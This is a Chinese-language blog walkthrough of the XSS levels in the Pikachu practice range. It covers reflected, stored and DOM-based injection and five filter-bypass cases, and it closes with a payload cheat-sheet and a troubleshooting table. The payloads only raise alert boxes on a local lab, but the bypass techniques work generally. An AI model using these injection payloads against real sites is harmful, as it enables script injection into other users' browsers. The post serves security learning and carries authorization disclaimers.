---
title: "Pikachu 靶场 XSS 通关笔记：反射型、存储型、DOM 型与五种绕过场景"
date: 2026-11-18
slug: pikachu-xss-walkthrough
description: "暴力破解之后继续刷 Pikachu：反射型、存储型、DOM 型 XSS 依次打通，再到过滤、盲打、htmlspecialchars、href 输出、JS 输出五种绕过场景。"
categories:
    - Web 安全
tags:
    - XSS
    - Pikachu
    - Burp Suite
---

上一篇记录的是靶场搭建和暴力破解四关。这一篇接着往下刷：进 XSS 模块，把基础五个关卡和五个绕过场景依次打通。

<!--more-->

> 安全声明：以下所有操作仅在自己的本地环境、自己搭建的靶场上进行。未授权的渗透测试属于违法行为，不要对任何非本人所有的站点抓包、爆破或测试。

## 一、XSS 的三种输出场景

Pikachu 的 XSS 模块按"漏洞出在哪、输出到哪"分成三类，先建立这个框架，后面每一关都能对上号。

| 类型 | 漏洞根源 | 典型输出位置 | 触发方式 |
| --- | --- | --- | --- |
| 反射型 | 后端未过滤，原样回显 | HTML 正文 | 诱导点击带 payload 的 URL |
| 存储型 | 后端未过滤，写入数据库 | 留言板、评论区、个人资料 | 所有访问者打开页面即触发 |
| DOM 型 | 前端 JS 未过滤，直接操作 DOM | `innerHTML`、标签属性 | 前端解析时触发，后端无感 |

## 二、基础五关

### 第 1 关：反射型 XSS（GET）

地址形如 `xss_reflected_get.php?message=<payload>&submit=submit`。

直接塞 `<script>alert('xss')</script>` 没弹窗，这一步很容易误判。真实原因不是后端过滤了，而是 Chrome / Edge 的浏览器内置 XSS 防护拦掉了反射型的 script 标签。

换成事件型 payload 立刻弹窗：

```html
<img src=x onerror=alert('xss')>
```

两个坑：

- **输入框有前端长度限制**，完整 payload 输不进去。绕过方式是直接改地址栏的 `message` 参数值，或者 F12 把输入框的 `maxlength` 删掉。
- 不管弹不弹窗，判定漏洞是否存在看源码：右键查看网页源码，搜索 `script` 或 `img`，标签完整、未被转义地出现在 HTML 里，漏洞就成立。

### 第 2 关：反射型 XSS（POST）

登录表单，把 payload 填进 **Username**，密码随便填。参数走请求体，被浏览器拦截的概率比 GET 低，但这里同样卡了一轮。

验证方式（比反复试 payload 更可靠）：

1. Burp 开 `Intercept on`，提交一次，抓到 `post_login.php` 的 POST 请求
2. 右键 `Send to Repeater`，把 `username` 改成 payload，`Send`
3. 切到 `Response`，往下翻，能看到标签原样输出 → 漏洞确认

要真的弹窗，按这个顺序递进试：

```html
<SCRIPT>alert('xss')</SCRIPT>
<script>eval('ale'+'rt("xss")')</script>
<input onfocus=alert('xss') autofocus>
```

第一个是大小写混淆（过滤器常只匹配小写），第二个是字符串拼接绕关键词，第三个靠自动聚焦触发事件、拦截率最低。这一关最后是靠事件型 payload 弹窗通关的。

### 第 3 关：存储型 XSS

留言板输入框直接提交：

```html
<script>alert('xss')</script>
```

提交即刻弹窗，刷新页面、重开页面还会弹——脚本已经写进数据库，属于持久化生效。这也是三类里危害最大的：不需要诱导谁点链接，所有访问这个页面的人都会中招。

### 第 4 关：DOM 型 XSS

这一关注入点不在 HTML 正文，而是在 `<a>` 标签的 `href` 属性里，所以 `<img src=x onerror=...>` 不会生效——它被当成属性值，不会被解析成元素。

两种可用写法：

```text
javascript:alert('xss')
```

```text
' onclick='alert("xss")
```

后者是闭合 `href` 的单引号，再插入 `onclick`，点生成的链接就弹窗。这一关全靠前端 JS 拼 DOM 造成，后端全程不参与。

### 第 5 关：DOM 型 XSS-X

我一开始按"payload 放在 URL 的 `#` 后面"的思路做，怎么都不弹——这个判断是错的。真正的注入点是 GET 参数 `text`：

```text
xss_dom_x.php?text=' onclick='alert(1)&submit=submit
```

另外注意引号冲突：`alert('xss')` 里的单引号和 `href` 的单引号打架，整段标签会被解析断掉，所以这里 payload 用 `alert(1)`。最终靠单引号闭合 + `onclick` 点击通关。

## 三、五个绕过关

### 1. xss 之过滤

后端只拦了 `<script>` 关键字，其他标签不管。所以换标签即可：

```html
<img src=x onerror=alert('xss')>
```

但输入框装不下这么长的 payload，被截断了，页面只会显示关卡自带的提示文字。绕过办法是直接改地址栏：

```text
xss_01.php?message=<img src=x onerror=alert('xss')>&submit=submit
```

这一关真正的考点不是 payload 写法，而是"换标签"和"绕前端长度限制"这两件事。

### 2. xss 之盲打

提交的内容不回显，页面上什么效果都看不到，所以叫盲打。脚本会被存进数据库，只有管理员在后台查看时才会执行。

步骤：

1. 在大输入框和"你的大名"里都填 `<script>alert('xss')</script>`，提交
2. 打开后台登录页。注意路径，我第一次写成了 `xss_blind_admin.php`，正确地址是：

```text
http://localhost/pikachu/vul/xss/xssblind/admin_login.php
```

3. 用 `admin / 123456` 登录后台，进入管理页立即弹窗

### 3. xss 之 htmlspecialchars

后端用了 PHP 的 `htmlspecialchars()`，默认转义 `<`、`>`、双引号、`&`，但**默认不转义单引号**，除非加 `ENT_QUOTES`。而这一关的输出位置恰好是单引号包裹的属性：

```html
<input type='text' value='用户输入'>
```

注入：

```text
' onclick='alert(1)
```

生成的标签变成 `value='' onclick='alert(1)'`，点击输入框就弹窗。这是真实业务里最常见的防护误区：用了转义函数，但没管输出位置的引号类型。

### 4. xss 之 href 输出

输出直接落在 `<a href="...">` 里，尖括号和引号都被转义了，靠闭合标签这条路走不通。但 `href` 天生支持 JS 伪协议：

```text
javascript:alert('xss')
```

提交后点页面上生成的链接就弹窗，全程不需要闭合任何东西。

### 5. xss 之 js 输出

输出被拼进前端 JS 的字符串变量里：

```javascript
var ms = "用户输入";
```

这里注入 HTML 标签毫无意义，要闭合 JS 字符串再插入语句：

```text
';alert('xss');//
```

逐段拆开：第一个 `'` 闭合字符串，`;` 结束原语句，`alert('xss')` 是载荷，末尾 `;` 收尾，`//` 把剩余代码注释掉保证语法不报错。提交后自动弹窗，不需要点击。

## 四、payload 速查

**自动触发（无需交互）**

```html
<svg onload=alert('xss')>
<input autofocus onfocus=alert('xss')>
<iframe src=x onload=alert('xss')></iframe>
<body onload=alert('xss')>
<video src=x onerror=alert('xss')>
<img src=x onerror=alert('xss')>
```

**需要交互**

```html
<a href="javascript:alert('xss')">点我</a>
<a href="#" onclick=alert('xss')>点我</a>
<div onmouseover=alert('xss')>鼠标移过来</div>
<button onclick=alert('xss')>点我</button>
```

**用于绕过**

```html
<SCRIPT>alert('xss')</SCRIPT>
<base href="http://恶意站点/">
<form action="javascript:alert('xss')"><input type="submit"></form>
```

选型思路：输出在正文、想自动触发就选 `img` / `svg` / `input autofocus`；输出在 `href`、`src` 属性就用 `javascript:` 伪协议；后端拦了 `script` 就换事件型标签；尖括号被转义就找属性输出的场景，用事件属性注入。

## 五、踩坑清单

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 提交 payload 不弹窗 | 浏览器内置 XSS 防护拦截，不代表后端无漏洞 | 看页面源码或 Burp 的 Response，标签原样输出即漏洞成立 |
| 输入框输不进完整 payload | 前端 `maxlength` 截断 | 改 URL 参数，或 F12 删掉 `maxlength` |
| `alert('xss')` 在属性里失效 | 单引号与属性引号冲突，标签解析断裂 | 换成 `alert(1)` 或改用双引号 |
| 盲打后台打不开 | 后台地址写错 | 用 `xssblind/admin_login.php`，账号 `admin / 123456` |
| DOM 型塞 `<img>` 不生效 | 注入点在 `href` 属性，不是正文 | 用 `javascript:` 伪协议或闭合属性插 `onclick` |

## 六、小结

把 XSS 这一轮走下来，真正记住的不是那几条 payload，而是三个判断：

1. **不弹窗不等于没漏洞**。浏览器的 XSS 防护是客户端行为，漏洞判定要看服务端响应里标签有没有被转义。
2. **payload 要跟着输出位置走**。正文、属性、JS 字符串是三种完全不同的上下文，同一段 `<img>` 在属性里就是一段普通文本。
3. **过滤往往只拦了一个关键词**。挡住 `<script>` 不等于挡住 XSS，事件型标签、伪协议、大小写混淆都是现成的替代路径。

再次提醒：以上内容仅用于本地靶场学习，请勿用于任何未授权的真实目标。
